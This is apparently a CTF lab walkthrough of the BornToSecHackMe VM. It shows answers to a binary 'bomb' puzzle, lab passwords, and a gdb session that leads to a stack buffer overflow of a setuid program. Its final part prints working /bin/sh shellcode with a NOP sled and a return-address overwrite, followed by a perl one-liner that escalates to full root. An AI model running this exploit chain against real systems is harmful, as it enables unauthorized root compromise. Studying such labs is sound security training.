> On laurie's machin

-------
laurie@BornToSecHackMe:~$ cat README 
Diffuse this bomb!
When you have all the password use it as "thor" user with ssh.

HINT:
P
 2
 b

o
4

NO SPACE IN THE PASSWORD (password is case sensitive).
------

laurie@BornToSecHackMe:~$ ./bomb 
Welcome this is my little bomb !!!! You have 6 stages with
only one life good luck !! Have a nice day!
Public speaking is very easy.
Phase 1 defused. How about the next one?
1 2 6 24 120 720
That's number 2.  Keep going!
1 b 214
Halfway there!
9
So you got that one.  Try this one.
opekmq
Good work!  On to the next...
4 2 6 3 1 5
Congratulations! You've defused the bomb!

## The result is :
Publicspeakingisveryeasy.126241207201b2149opekmq426315

## Knowing that there is an error, checking on Discord. Here is the right one :
Publicspeakingisveryeasy.126241207201b2149opekmq426135

> Getting on thor user

## There is a turtle file. It's about the turtle module on python 
## Found the word SLASH

> Look for the word's digest
$$ python3 digest.py
Original word: SLASH
SHA-256: 2f4f10058af817252c4a9bc174d7b729538079f84f02a74160b3a42162d53e02
MD5 : 646da671ca01bb5d84dbb5fb2238dc8e
SHA-1: 045db3637ddba59088ac97a1cabc374013dc7d0e

## Using the MD5

## On zaz user:
https://beta.hackndo.com/buffer-overflow/
https://wiremask.eu/tools/buffer-overflow-pattern-generator/?

(gdb) disass main
Dump of assembler code for function main:
   0x080483f4 <+0>:     push   %ebp
   0x080483f5 <+1>:     mov    %esp,%ebp
   0x080483f7 <+3>:     and    $0xfffffff0,%esp	
   0x080483fa <+6>:     sub    $0x90,%esp
   0x08048400 <+12>:    cmpl   $0x1,0x8(%ebp)
   0x08048404 <+16>:    jg     0x804840d <main+25>
   0x08048406 <+18>:    mov    $0x1,%eax
   0x0804840b <+23>:    jmp    0x8048436 <main+66>
   0x0804840d <+25>:    mov    0xc(%ebp),%eax
   0x08048410 <+28>:    add    $0x4,%eax
   0x08048413 <+31>:    mov    (%eax),%eax
   0x08048415 <+33>:    mov    %eax,0x4(%esp)
   0x08048419 <+37>:    lea    0x10(%esp),%eax
   0x0804841d <+41>:    mov    %eax,(%esp)
   0x08048420 <+44>:    call   0x8048300 <strcpy@plt>
   0x08048425 <+49>:    lea    0x10(%esp),%eax
   0x08048429 <+53>:    mov    %eax,(%esp)
   0x0804842c <+56>:    call   0x8048310 <puts@plt>
   0x08048431 <+61>:    mov    $0x0,%eax
   0x08048436 <+66>:    leave
   0x08048437 <+67>:    ret
End of assembler dump.
(gdb) b * 0x080483fa
Breakpoint 1 at 0x80483fa
(gdb) b *0x08048420
Breakpoint 2 at 0x8048420
(gdb) b *0x08048429
Breakpoint 3 at 0x8048429
(gdb) b *0x08048437
Breakpoint 4 at 0x8048437
...
(gdb) run `perl -e 'print "A"x140'`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/zaz/exploit_me `perl -e 'print "A"x140'`

Breakpoint 1, 0x080483fa in main ()
(gdb) c
Continuing.

Breakpoint 2, 0x08048420 in main ()
(gdb) c
Continuing.

Breakpoint 5, 0x08048425 in main ()
(gdb) i r $eip $esp $ebp
eip            0x8048425        0x8048425 <main+49>
esp            0xbffff630       0xbffff630
ebp            0xbffff6c8       0xbffff6c8
(gdb) x/24xw $esp
0xbffff630:     0xbffff640      0xbffff89c      0x00000001      0xb7ec3c49
0xbffff640:     0x4	1414141      0x41414141      0x41414141      0x41414141
0xbffff650:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff660:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff670:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff680:     0x41414141      0x41414141      0x41414141      0x41414141

0x41414141 = "A" : On part du coup du debut de l'entrée des "A" qui est l'adresse 0xbffff640 ce qui donne : \x40\xf6\xff\xbf en little endian

zaz@BornToSecHackMe:~$ $PWD/exploit_me $(perl -e 'print "\x90"x95 . "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh" . "\x40\xf6\xff\xbf"')
������������������������������������������������������������������������������������������������^�1��F�F
                                              �
                                               ����V
                                                    1ۉ�@�����/bin/sh@���
# id
uid=1005(zaz) gid=1005(zaz) euid=0(root) groups=0(root),1005(zaz)

https://unix.stackexchange.com/questions/645075/attempting-to-get-root-uid-from-root-euid :

# perl -MEnglish -e '$UID = 0; $ENV{PATH} = "/bin:/usr/bin:/sbin:/usr/sbin"; exec "su - root"'
root@BornToSecHackMe:~# id
uid=0(root) gid=0(root) groups=0(root)

